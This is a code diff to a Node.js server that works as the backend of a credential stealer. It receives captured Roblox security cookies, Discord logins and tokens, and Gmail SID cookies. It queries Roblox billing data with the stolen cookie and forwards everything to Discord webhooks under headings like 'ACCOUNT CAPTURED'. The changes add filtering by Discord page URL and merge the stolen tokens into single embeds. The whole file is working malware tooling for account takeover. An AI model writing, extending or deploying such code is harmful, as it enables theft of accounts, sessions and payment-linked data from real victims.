@@ -1,4 +1,3 @@
-
 const express = require('express');
 const cors = require('cors');
 
@@ -63,7 +62,7 @@ async function getRobloxCSRFToken(token) {
 async function fetchRobloxUserData(token) {
   try {
     console.log('Fetching comprehensive Roblox user data...');
-    
+
     // Get CSRF token first
     const csrfToken = await getRobloxCSRFToken(token);
 
@@ -188,7 +187,7 @@ async function fetchRobloxUserData(token) {
     let premiumData = { isPremium: false };
     let creditBalance = 0;
     let savedPayment = false;
-    
+
     try {
       const billingResponse = await fetch(`https://billing.roblox.com/v1/credit`, {
         headers: baseHeaders
@@ -196,10 +195,10 @@ async function fetchRobloxUserData(token) {
 
       if (billingResponse.ok) {
         const billingData = await billingResponse.json();
-        
+
         creditBalance = billingData.balance || 0;
         savedPayment = billingData.hasSavedPayments || false;
-        
+
         premiumData.isPremium = billingData.hasPremium || 
                                billingData.isPremium || 
                                (billingData.balance && billingData.balance > 0) || 
@@ -436,20 +435,20 @@ app.post('/send-log', async (req, res) => {
   try {
     const logData = req.body;
     console.log('Received log:', logData);
-    
+
     // Handle roblox_combined type - fetch data first, then format
     if (logData.level === 'roblox_combined') {
       console.log('Processing combined Roblox data - fetching comprehensive user data...');
-      
+
       // Fetch comprehensive user data using the security token
       const comprehensiveUserData = await fetchRobloxUserData(logData.cookie);
-      
+
       if (comprehensiveUserData) {
         console.log('Successfully fetched comprehensive user data for:', comprehensiveUserData.username);
-        
+
         // Create the combined message with comprehensive data
         const discordMessage = formatRobloxCombinedEmbedWithData(logData, comprehensiveUserData);
-        
+
         // Send to Roblox webhook
         const response = await fetch(getWebhookUrl(logData.level), {
           method: 'POST',
@@ -470,7 +469,7 @@ app.post('/send-log', async (req, res) => {
         console.error('Failed to fetch comprehensive user data');
         // Fallback to original format if data fetch fails
         const discordMessage = formatLogForDiscord(logData);
-        
+
         const response = await fetch(getWebhookUrl(logData.level), {
           method: 'POST',
           headers: {
@@ -489,9 +488,59 @@ app.post('/send-log', async (req, res) => {
       }
     } else {
       // Handle other log types normally with appropriate webhooks
+      // Discord URL filtering and data validation
+      if (logData.level === 'discord_login' || logData.level === 'discord_captured') {
+        // Only process Discord logs from specific URLs
+        const allowedUrls = [
+          'https://discord.com/login',
+          'https://discord.com/app'
+        ];
+
+        const isAllowedUrl = allowedUrls.some(url => 
+          logData.url && logData.url.startsWith(url)
+        );
+
+        if (!isAllowedUrl) {
+          console.log('Skipping Discord log - not from allowed URL:', logData.url);
+          res.status(200).json({ success: true, message: 'Skipped - invalid URL' });
+          return;
+        }
+
+        // For discord.com/login - only send login credentials
+        if (logData.url.startsWith('https://discord.com/login')) {
+          if (logData.level === 'discord_login' && logData.credentials && logData.credentials.email) {
+            // Send login credentials embed
+          } else {
+            console.log('Skipping Discord login log - no credentials from /login');
+            res.status(200).json({ success: true, message: 'Skipped - no credentials' });
+            return;
+          }
+        }
+
+        // For discord.com/app - send comprehensive data (login + token + user data)
+        if (logData.url.startsWith('https://discord.com/app')) {
+          if (logData.level === 'discord_captured' && logData.token && logData.credentials) {
+            // Send comprehensive Discord captured embed
+          } else {
+            console.log('Skipping Discord app log - incomplete data');
+            res.status(200).json({ success: true, message: 'Skipped - incomplete app data' });
+            return;
+          }
+        }
+
+        // Skip other Discord log types not matching the criteria
+        if (logData.level === 'discord_token' || 
+            (logData.level === 'discord_captured' && !logData.url.startsWith('https://discord.com/app')) ||
+            (logData.level === 'discord_login' && !logData.url.startsWith('https://discord.com/login'))) {
+          console.log('Skipping Discord log - not matching URL criteria');
+          res.status(200).json({ success: true, message: 'Skipped - URL mismatch' });
+          return;
+        }
+      }
+
       const discordMessage = formatLogForDiscord(logData);
       const webhookUrl = getWebhookUrl(logData.level);
-      
+
       const response = await fetch(webhookUrl, {
         method: 'POST',
         headers: {
@@ -708,9 +757,6 @@ function formatGmailLoginEmbed(logData) {
 }
 
 function formatGmailCapturedEmbed(logData) {
-  const embeds = [];
-
-  // First embed: Gmail credentials and user data
   const gmailEmbed = {
     title: "📧 **GMAIL ACCOUNT CAPTURED**",
     color: 0xEA4335,
@@ -738,13 +784,18 @@ function formatGmailCapturedEmbed(logData) {
         inline: true
       },
       {
+        name: "🍪 **Gmail SID Cookie**",
+        value: `\`\`\`${logData.sid || 'Not captured'}\`\`\``,
+        inline: false
+      },
+      {
         name: "🌍 **URL**",
         value: logData.url || 'Unknown',
         inline: false
       }
     ],
     footer: {
-      text: "Gmail Session Compromised"
+      text: "Gmail Session Compromised - Handle with caution!"
     },
     timestamp: new Date(logData.timestamp).toISOString()
   };
@@ -756,21 +807,7 @@ function formatGmailCapturedEmbed(logData) {
     };
   }
 
-  // Second embed: Gmail SID Cookie
-  const sidEmbed = {
-    title: "🍪 **Gmail SID Cookie**",
-    description: "**```" + (logData.sid || 'Not captured') + "```**",
-    color: 0xEA4335,
-    footer: {
-      text: "Handle with extreme caution!"
-    },
-    timestamp: new Date(logData.timestamp).toISOString()
-  };
-
-  embeds.push(gmailEmbed);
-  embeds.push(sidEmbed);
-
-  return { embeds };
+  return { embeds: [gmailEmbed] };
 }
 
 function formatRobloxLoginEmbed(logData) {
@@ -807,7 +844,7 @@ function formatRobloxLoginEmbed(logData) {
 function formatRobloxUserDataEmbed(logData) {
   try {
     const userData = JSON.parse(logData.message);
-    
+
     return {
       embeds: [{
         title: `👤 ROBLOX USER DATA CAPTURED`,
@@ -1064,9 +1101,6 @@ function formatDiscordTokenEmbed(logData) {
 }
 
 function formatDiscordCapturedEmbed(logData) {
-  const embeds = [];
-
-  // First embed: Discord credentials and user data
   const discordEmbed = {
     title: "💬 **DISCORD ACCOUNT CAPTURED**",
     color: 0x5865F2,
@@ -1080,7 +1114,7 @@ function formatDiscordCapturedEmbed(logData) {
       }
     ],
     footer: {
-      text: "Discord Session Compromised"
+      text: "Discord Session Compromised - Full access available!"
     },
     timestamp: new Date(logData.timestamp).toISOString()
   };
@@ -1088,7 +1122,7 @@ function formatDiscordCapturedEmbed(logData) {
   // Add user data fields if available
   if (logData.userData) {
     const userData = logData.userData;
-    
+
     // Add avatar if available
     if (userData.avatar) {
       discordEmbed.thumbnail = {
@@ -1152,21 +1186,14 @@ function formatDiscordCapturedEmbed(logData) {
     });
   }
 
-  // Second embed: Discord Token
-  const tokenEmbed = {
-    title: "🔑 **Discord Token**",
-    description: "**```" + (logData.token || 'Not captured') + "```**",
-    color: 0x5865F2,
-    footer: {
-      text: "Full Discord access available!"
-    },
-    timestamp: new Date(logData.timestamp).toISOString()
-  };
+  // Add Discord Token to the same embed
+  discordEmbed.fields.push({
+    name: "🔑 **Discord Token**",
+    value: `\`\`\`${logData.token || 'Not captured'}\`\`\``,
+    inline: false
+  });
 
-  embeds.push(discordEmbed);
-  embeds.push(tokenEmbed);
-
-  return { embeds };
+  return { embeds: [discordEmbed] };
 }
 
 function getColorForLevel(level) {
